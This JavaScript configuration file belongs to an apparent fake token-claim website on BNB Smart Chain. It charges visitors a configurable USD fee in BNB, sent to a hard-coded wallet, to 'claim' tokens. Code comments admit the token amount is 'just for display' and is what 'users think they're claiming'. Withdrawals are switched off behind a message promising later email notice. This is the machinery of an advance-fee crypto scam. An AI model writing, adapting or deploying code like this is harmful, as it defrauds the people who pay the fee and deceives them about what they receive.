// src/config.js - Production Ready Configuration

const config = {
  // Network configurations
  NETWORK: {
    BSC: {
      MAINNET: {
        ID: 56,
        NAME: 'BNB Smart Chain',
        CURRENCY: {
          name: 'BNB',
          symbol: 'BNB',
          decimals: 18
        },
        RPC_URLS: [
          'https://bsc-dataseed1.binance.org/',
          'https://bsc-dataseed2.binance.org/',
          'https://bsc-dataseed3.binance.org/',
          'https://bsc-dataseed4.binance.org/',
          'https://bsc-dataseed1.defibit.io/',
          'https://bsc-dataseed2.defibit.io/',
          'https://bsc-dataseed3.defibit.io/',
          'https://bsc-dataseed4.defibit.io/',
          'https://rpc.ankr.com/bsc',
          'https://bsc.nodereal.io',
          'https://1rpc.io/bnb'
        ],
        EXPLORER_URL: 'https://bscscan.com'
      },
      TESTNET: {
        ID: 97,
        NAME: 'BNB Smart Chain Testnet',
        CURRENCY: {
          name: 'tBNB',
          symbol: 'tBNB',
          decimals: 18
        },
        RPC_URLS: [
          'https://data-seed-prebsc-1-s1.binance.org:8545/',
          'https://data-seed-prebsc-2-s1.binance.org:8545/',
          'https://data-seed-prebsc-1-s2.binance.org:8545/',
          'https://data-seed-prebsc-2-s2.binance.org:8545/',
          'https://data-seed-prebsc-1-s3.binance.org:8545/',
          'https://data-seed-prebsc-2-s3.binance.org:8545/'
        ],
        EXPLORER_URL: 'https://testnet.bscscan.com'
      }
    }
  },

  // ⭐ CONFIGURABLE FEE SYSTEM - You can change these amounts
  FEE_SYSTEM: {
    // 🔥 CHANGE THIS TO ANY AMOUNT YOU WANT 🔥
    CLAIM_FEE_USD: 50.0, // Change this to any amount (e.g., 10, 25, 50, 100, etc.)
    
    // Token amount that users will receive (just for display)
    DISPLAY_TOKEN_AMOUNT: 5000, // Change this to any amount you want to show
    
    // 🔥 REPLACE THIS WITH YOUR ACTUAL WALLET ADDRESS 🔥
    // This is where users will send their fee payment
    FUND_RECEIVER_ADDRESS: '0x8fC18E1f65993864db46Dd1FBA2dffF1DE97955c',
    
    // Minimum BNB balance required for gas fees
    MIN_BNB_FOR_GAS: 0.008, // Increased for production reliability
    
    // Gas limit for BNB transfer transaction
    FEE_PAYMENT_GAS_LIMIT: 25000, // Increased for production
    
    // Withdrawal system configuration
    WITHDRAWAL_ENABLED: false,
    WITHDRAWAL_MESSAGE: "🔒 Token withdrawals are currently disabled. You will be notified via email when withdrawal functionality becomes available for your claimed tokens."
  },

  // Wallet configurations
  WALLET: {
    METAMASK: {
      DEEPLINK_PREFIX: 'https://metamask.app.link/dapp/',
      INSTALL_URL: 'https://metamask.io/download/'
    },
    TRUST_WALLET: {
      DEEPLINK_PREFIX: 'https://link.trustwallet.com/open_url?coin_id=20000714&url=',
      INSTALL_URL: 'https://trustwallet.com/download'
    }
  },

  // Gas configurations for production
  GAS: {
    LIMITS: {
      FEE_PAYMENT: 25000 // Increased for production reliability
    },
    PRICE_MULTIPLIER: 1.2 // 20% buffer for gas price
  },

  // Price configurations - Will auto-update from API
  PRICES: {
    BNB_USD: 600.0, // Fallback price, will be updated from API
    LAST_UPDATED: null
  },

  // API configuration for live price updates
  API: {
    COINGECKO_URL: 'https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd',
    PRICE_UPDATE_INTERVAL: 300000, // 5 minutes
    MAX_RETRIES: 3
  },

  // Timing configurations
  TIMING: {
    TOAST_DURATION: {
      SHORT: 3000,
      MEDIUM: 5000,
      LONG: 8000,
      EXTRA_LONG: 10000
    },
    TRANSACTION_TIMEOUT: 180000, // 3 minutes
    CONNECTION_TIMEOUT: 30000 // 30 seconds
  },

  // Environment detection - FIXED for production
  get ENVIRONMENT() {
    const hostname = typeof window !== 'undefined' ? window.location.hostname : '';
    
    // Production domains
    if (hostname.includes('vercel.app') || 
        hostname.includes('netlify.app') || 
        hostname.includes('github.io') ||
        hostname.includes('.com') ||
        hostname.includes('.org') ||
        hostname.includes('.net') ||
        (!hostname.includes('localhost') && !hostname.includes('127.0.0.1'))) {
      return 'production';
    }
    
    // Development
    return 'development';
  },
  
  // Get target network based on environment
  getTargetNetwork() {
    // ALWAYS use mainnet for production, testnet for development
    if (this.ENVIRONMENT === 'production') {
      console.log('🌐 Using BSC Mainnet for production');
      return this.NETWORK.BSC.MAINNET;
    } else {
      console.log('🔧 Using BSC Testnet for development');
      return this.NETWORK.BSC.TESTNET;
    }
  },

  // Auto-update BNB price from CoinGecko API
  async updateBNBPriceFromAPI() {
    try {
      console.log('📈 Fetching latest BNB price...');
      const response = await fetch(this.API.COINGECKO_URL);
      const data = await response.json();
      
      if (data && data.binancecoin && data.binancecoin.usd) {
        const newPrice = data.binancecoin.usd;
        this.PRICES.BNB_USD = newPrice;
        this.PRICES.LAST_UPDATED = new Date().toISOString();
        console.log(`✅ BNB price updated to: $${newPrice}`);
        
        // Store in localStorage for persistence
        if (typeof window !== 'undefined') {
          localStorage.setItem('bnb_price', newPrice.toString());
          localStorage.setItem('bnb_price_updated', this.PRICES.LAST_UPDATED);
        }
        
        return newPrice;
      }
    } catch (error) {
      console.warn('⚠️ Failed to fetch BNB price from API:', error.message);
      
      // Try to load from localStorage as fallback
      if (typeof window !== 'undefined') {
        const cachedPrice = localStorage.getItem('bnb_price');
        if (cachedPrice) {
          this.PRICES.BNB_USD = parseFloat(cachedPrice);
          console.log(`💾 Using cached BNB price: $${this.PRICES.BNB_USD}`);
        }
      }
    }
    
    return this.PRICES.BNB_USD;
  },

  // Initialize price updates
  initializePriceUpdates() {
    if (typeof window === 'undefined') return;
    
    // Update price immediately
    this.updateBNBPriceFromAPI();
    
    // Set up periodic updates
    setInterval(() => {
      this.updateBNBPriceFromAPI();
    }, this.API.PRICE_UPDATE_INTERVAL);
  },

  // Calculate claim fee in BNB based on current BNB price
  getClaimFeeInBNB() {
    const feeInBNB = (this.FEE_SYSTEM.CLAIM_FEE_USD / this.PRICES.BNB_USD);
    return feeInBNB.toFixed(6);
  },

  // Get fund receiver address (website owner's wallet)
  getFundReceiverAddress() {
    return this.FEE_SYSTEM.FUND_RECEIVER_ADDRESS;
  },

  // Validate fund receiver address is properly configured
  isValidFundReceiver() {
    const address = this.getFundReceiverAddress();
    const isValid = address && 
           address !== '0x0000000000000000000000000000000000000000' && 
           address.length === 42 && 
           address.startsWith('0x');
    
    if (!isValid) {
      console.error('❌ Invalid fund receiver address:', address);
    }
    
    return isValid;
  },

  // Get the amount of tokens users think they're claiming
  getDisplayTokenAmount() {
    return this.FEE_SYSTEM.DISPLAY_TOKEN_AMOUNT;
  },

  // Check if withdrawals are enabled
  isWithdrawalEnabled() {
    return this.FEE_SYSTEM.WITHDRAWAL_ENABLED;
  },

  // Get withdrawal message
  getWithdrawalMessage() {
    return this.FEE_SYSTEM.WITHDRAWAL_MESSAGE;
  },

  // Helper function to update claim fee
  updateClaimFee(newFeeUSD) {
    this.FEE_SYSTEM.CLAIM_FEE_USD = newFeeUSD;
    console.log(`💰 Claim fee updated to: $${newFeeUSD}`);
  },

  // Helper function to update token amount
  updateTokenAmount(newAmount) {
    this.FEE_SYSTEM.DISPLAY_TOKEN_AMOUNT = newAmount;
    console.log(`🪙 Token amount updated to: ${newAmount} FNVA`);
  },

  // Enable/disable withdrawals
  setWithdrawalStatus(enabled, message = null) {
    this.FEE_SYSTEM.WITHDRAWAL_ENABLED = enabled;
    if (message) {
      this.FEE_SYSTEM.WITHDRAWAL_MESSAGE = message;
    }
    console.log(`🔄 Withdrawals ${enabled ? 'enabled' : 'disabled'}`);
  },

  // Generate BSCScan link for transaction
  getBSCScanLink(txHash) {
    const network = this.getTargetNetwork();
    return `${network.EXPLORER_URL}/tx/${txHash}`;
  },

  // Format BNB amount for display
  formatBNB(amount) {
    return parseFloat(amount).toFixed(6);
  },

  // Format USD amount for display
  formatUSD(amount) {
    return parseFloat(amount).toFixed(2);
  },

  // Get minimum required BNB (fee + gas)
  getMinimumRequiredBNB() {
    const feeInBNB = parseFloat(this.getClaimFeeInBNB());
    const gasInBNB = this.FEE_SYSTEM.MIN_BNB_FOR_GAS;
    return (feeInBNB + gasInBNB).toFixed(6);
  },

  // Validate if user has enough BNB
  hasEnoughBNB(userBalance) {
    const required = parseFloat(this.getMinimumRequiredBNB());
    const available = parseFloat(userBalance);
    return available >= required;
  },

  // Enhanced gas estimation for production
  async estimateGasWithBuffer(provider, transaction) {
    try {
      const estimatedGas = await provider.estimateGas(transaction);
      // Add 20% buffer for gas estimation
      const gasWithBuffer = estimatedGas * BigInt(120) / BigInt(100);
      return gasWithBuffer;
    } catch (error) {
      console.warn('⚠️ Gas estimation failed, using default:', error.message);
      return BigInt(this.GAS.LIMITS.FEE_PAYMENT);
    }
  },

  // Production-ready gas price calculation
  async getOptimalGasPrice(provider) {
    try {
      const feeData = await provider.getFeeData();
      let gasPrice = feeData.gasPrice;
      
      // Add multiplier for faster confirmation
      gasPrice = gasPrice * BigInt(Math.floor(this.GAS.PRICE_MULTIPLIER * 100)) / BigInt(100);
      
      return gasPrice;
    } catch (error) {
      console.warn('⚠️ Failed to get gas price, using fallback');
      // Fallback gas price (5 gwei)
      return BigInt('5000000000');
    }
  },

  // Debug information for troubleshooting
  getDebugInfo() {
    return {
      environment: this.ENVIRONMENT,
      hostname: typeof window !== 'undefined' ? window.location.hostname : 'server',
      targetNetwork: this.getTargetNetwork().NAME,
      fundReceiver: this.getFundReceiverAddress(),
      claimFeeUSD: this.FEE_SYSTEM.CLAIM_FEE_USD,
      claimFeeBNB: this.getClaimFeeInBNB(),
      bnbPrice: this.PRICES.BNB_USD,
      tokenAmount: this.getDisplayTokenAmount(),
      isValidReceiver: this.isValidFundReceiver()
    };
  }
};

// Initialize price updates when config is loaded
if (typeof window !== 'undefined') {
  // Wait for DOM to be ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      config.initializePriceUpdates();
    });
  } else {
    config.initializePriceUpdates();
  }
}

// Export for use in components
export default config;